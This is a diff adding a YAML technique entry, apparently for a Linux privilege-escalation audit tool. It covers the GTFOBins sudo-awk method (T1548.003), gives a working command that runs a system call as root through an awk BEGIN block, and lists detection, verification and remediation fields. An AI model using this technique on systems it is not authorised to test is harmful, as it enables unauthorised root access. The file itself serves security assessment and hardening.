@@ -1,0 +1,22 @@
+# Sudo → root via awk (GTFOBins)
+technique: T1548.003
+name: Sudo → root via awk (GTFOBins)
+tactic: [privilege-escalation]
+platform: [linux]
+ranking:
+  exploitability: high
+  safety: read-only
+  detection: quiet
+detect:
+  sudo_allows: awk
+execute:
+  command: 'sudo awk ''BEGIN{system("id")}'''
+verify:
+  success: "uid=0"
+cleanup:
+  command: ""
+report:
+  vector_type: gtfobins_sudo
+  description: Sudo NOPASSWD on `awk` — arbitrary `system()` via a BEGIN block.
+  remediation: Drop `awk` from sudoers.
+  refs: [T1548.003, GTFOBins/awk]
